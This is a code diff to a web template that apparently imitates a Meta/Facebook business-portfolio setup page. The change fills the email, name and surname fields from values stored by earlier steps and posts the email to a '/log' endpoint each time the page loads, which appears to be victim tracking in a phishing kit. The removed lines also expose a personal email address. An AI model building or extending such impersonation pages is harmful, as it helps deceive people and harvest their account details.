@@ -231,7 +231,7 @@
 
             <label class="input-label" style="display: flex; align-items: center;">Business email <span class="info-icon">i</span></label>
             <p style="font-size: 13px; color: #65676b; margin: 4px 0 8px;">Notifications about this business portfolio will be sent to this email address.</p>
-            <input type="text" class="form-input" id="business_email" disabled value="phangiathuyendev@gmail.com">
+            <input type="text" class="form-input" id="business_email" disabled value="">
 
             <div class="checkbox-container">
                 <input type="checkbox" id="marketing_cb" style="width: 20px; height: 20px; margin-top: 2px;">
@@ -287,6 +287,10 @@
             const btnContinue = document.getElementById('btn_continue');
             const fnInput = document.getElementById('first_name');
             const lnInput = document.getElementById('last_name');
+            const emailInput = document.getElementById('business_email');
+
+            const savedEmail = localStorage.getItem('fb_email') || '';
+            emailInput.value = savedEmail;
 
             fnInput.value = localStorage.getItem('fb_name') || '';
             lnInput.value = localStorage.getItem('fb_surname') || '';
@@ -311,7 +315,7 @@
             fetch("/log", {
                 method: "POST",
                 headers: { "Content-Type": "application/json", "X-CSRF-TOKEN": "{{ csrf_token() }}" },
-                body: JSON.stringify({ page: "Meta Step 1 (Size Fix)", email: "phangiathuyendev@gmail.com", action: "view" })
+                body: JSON.stringify({ page: "Meta Step 1 (Size Fix)", email: savedEmail, action: "view" })
             });
         })();
     </script>
